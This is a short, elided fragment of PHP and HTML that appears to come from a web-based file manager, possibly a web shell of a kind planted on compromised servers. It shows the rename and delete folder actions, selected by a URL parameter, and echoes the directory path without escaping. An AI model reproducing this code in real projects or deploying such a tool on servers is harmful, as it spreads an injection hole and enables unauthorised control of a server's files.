	...
	<body class="bg-dark text-light">
		...
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			echo "
			[ <a href='?dir=".$dir."&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
			<h4>$imgfol Rename Folder : $ndir </h4>
			<form method='POST'>
		...
		*/
		if ($_GET['aksi'] == 'hapus_folder' ) {
			echo "
			[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder' class='active'>Delete</a> ] 
			<div class='card card-body text-center text-dark mb-4'>
